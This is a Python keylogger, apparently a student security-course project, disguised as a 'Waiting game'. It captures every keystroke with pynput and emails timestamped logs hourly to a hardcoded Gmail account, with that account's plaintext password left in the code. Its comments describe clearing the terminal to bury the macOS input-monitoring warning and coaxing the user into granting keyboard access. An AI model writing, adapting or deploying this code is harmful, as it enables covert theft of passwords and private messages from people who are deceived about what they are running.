#!/usr/bin/env python

import smtplib
import time
import signal
import os
from sys import platform, exit
from pynput import keyboard
from threading import Thread

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

INTERVAL = 3600
R_FILE = "read.txt"
T_FILE = "time.txt"

EMAIL = "keylogger.COMP6841@gmail.com"
PASSWORD = "FLIT6truism7sherry"

r_log = ""
t_log = ""

server = smtplib.SMTP(host="smtp.gmail.com", port=587)

# On a keyboard interrupt (SIGINT), send one last email
def sigint_handler(sig, frame):
    send_email()
    exit(0)

signal.signal(signal.SIGINT, sigint_handler)

# A thread to run in the background and regularly send emails
class Sender(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.last_sent = time.time()

    def run(self):
        global server
        server.starttls()
        server.login(EMAIL, PASSWORD)

        while True:
            if (time.time() - self.last_sent) > INTERVAL:

                send_email()
                self.last_sent = time.time()

# Handles keyboard presses
def on_press(key):

    global r_log, t_log

    try:
        r_log += f'{key.char}'
        t_log += f'[{time.asctime(time.localtime())}]: {key.char}\n'

    except AttributeError:
        if key == keyboard.Key.space:
            r_log += ' '
        elif key == keyboard.Key.enter:
            r_log += '\n'
        else:
            r_log += f' {key} '
        t_log += f'[{time.asctime(time.localtime())}]: {key}\n'

# If this program is running on a Mac, it'll do a little extra to seem less suspicious
# Macs give a warning message about letting the listener process look at your keyboard
# The sleep leaves a window and provokes the warning message, so it can be quickly
# drowned out with a bunch of newlines.
def welcome():

    time.sleep(0.1)
    #print('\n'*100)
    cmd = 'clear'
    if os.name == 'nt':
        cmd = cls
    os.system(cmd)

    if platform == 'darwin':
        # A lovely reassuring message to assure the user that all is well :)
        print("To play this game, you'll need to go to System Preferences > Security & Privacy > Privacy > Input Monitoring and check the box next to the terminal.")

    print("--------------------")
    print("Welcome to the Waiting game!")
    print("Keep this program running until something happens.")
    print("How long will you have to wait?")
    print("You'll have to wait and see...")
    print("(If you close this program, you'll have to start again!)")

# Play the waiting game ;)
def wait():
    time.sleep(60*60*24)

# Turns the extended strings being constructed into text files, and sends them over email
def send_email():
    message = MIMEMultipart()
    message["From"] = EMAIL
    message['To'] = EMAIL
    message['Subject'] = "Keylog"

    # Create readable file from log
    r_temp = open(R_FILE, "w")
    r_temp.write(r_log)
    r_temp.close()

    # Create timestamp file from log
    t_temp = open(T_FILE, "w")
    t_temp.write(t_log)
    t_temp.close()

    # Attach readable file
    r_logfile = open(R_FILE, 'rb')
    r_att = MIMEBase('application','octet-stream')
    r_att.set_payload((r_logfile).read())
    encoders.encode_base64(r_att)
    r_att.add_header('Content-Disposition',"attachment; filename= "+R_FILE)
    message.attach(r_att)

    # Attach timestamp file
    t_logfile = open(T_FILE, 'rb')
    t_att = MIMEBase('application','octet-stream')
    t_att.set_payload((t_logfile).read())
    encoders.encode_base64(t_att)
    t_att.add_header('Content-Disposition',"attachment; filename= "+T_FILE)
    message.attach(t_att)

    email_msg = message.as_string()

    server.sendmail(EMAIL, EMAIL, email_msg)

    # Delete files
    r_logfile.close()
    t_logfile.close()
    os.remove(R_FILE)
    os.remove(T_FILE)

if __name__ == '__main__':

    # Start the keylogger thread
    keylogger = keyboard.Listener(
        on_press=on_press)
    keylogger.daemon = True
    keylogger.start()

    # Start the sender thread
    sender = Sender()
    sender.daemon = True
    sender.start()

    # Welcome message, drown out the warning if on mac
    welcome()

    # Run the "game"
    while True:
        wait()
